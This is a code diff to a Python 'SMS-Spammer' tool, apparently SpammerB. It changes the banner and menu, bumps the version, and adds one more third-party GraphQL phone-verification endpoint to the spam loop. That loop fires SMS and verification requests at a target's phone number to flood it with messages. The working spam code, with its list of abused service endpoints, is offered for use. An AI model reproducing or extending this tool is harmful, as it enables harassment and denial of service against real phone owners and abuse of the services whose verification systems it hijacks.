@@ -12,11 +12,10 @@ from requests.exceptions import ConnectionError
 def banner():
     system("cls" if name == "nt" else "clear")
     print(Style.BRIGHT + Fore.GREEN)
-    print(r"     The spammer was translated to the English version.")
-    print(r"     The developer who made this spammer: https://github.com/baksff/SpammerB")
-    print()
-    print(Style.BRIGHT + Fore.BLUE)
-    print(r"     Translated: vk.com/idnlnety")
+    print(r"  ___ ___  _   __  __ __  __ ___ ___  ")
+    print(r" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
+    print(r" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
+    print(r" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
     print(Style.RESET_ALL)
 
 
@@ -28,7 +27,8 @@ def main():
         banner()
         print("[1] SMS-Spammer.")
         print("[2] Update spammer.")
-        print("[3] Exit.")
+        print("[3] Info.")
+        print("[4] Exit.")
         print()
         number = input(Style.BRIGHT + Fore.BLUE + "Enter the item: " + Style.RESET_ALL)
         if number == "1":
@@ -39,6 +39,10 @@ def main():
             check_connection()
             update()
         elif number == "3":
+            print(Style.BRIGHT + Fore.GREEN)
+            print("[SpB] The spammer was translated to the English version.")
+            print("[SpB] The developer who made this spammer: https://github.com/baksff/SpammerB")
+        elif number == "4":
             print()
             exit()
         else:
@@ -51,7 +55,7 @@ def main():
 def sms_spam():
     banner()
     print("Enter the number")
-    phone = input(Style.BRIGHT + Fore.BLUE + "SpammerB >>  " + Style.RESET_ALL)
+    phone = input(Style.BRIGHT + Fore.BLUE + "SpammerB >> " + Style.RESET_ALL)
     phone = parse_phone(phone)
     start_sms_spam(phone)
 
@@ -969,6 +973,11 @@ def start_sms_spam(phone):
                  headers={"User-Agent": user_agent})
         except:
             pass
+        try:
+            post("https://www.ollis.ru/gql",
+                json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
+        except:
+            pass
 
 
 def parse_phone(phone):
@@ -1017,8 +1026,8 @@ def check_connection():
 
 
 def check_version():
-    current_version = "1.0"
-    version = get("https://raw.githubusercontent.com/baksff/SpammerB/main/version.txt?token=ARFDCBYMV27VHTRHPGD6QYK7RU77E").text
+    current_version = "1.1"
+    version = get("https://raw.githubusercontent.com/baksff/SpammerB/main/version.txt?token=ARFDCB5BEE7KJGRV67ZKD4S7RVCIW").text
     if float(current_version) < float(version):
         print()
         print(Style.BRIGHT + Fore.RED + "[SpB] The version is outdated and needs to be updated!" + Style.RESET_ALL)
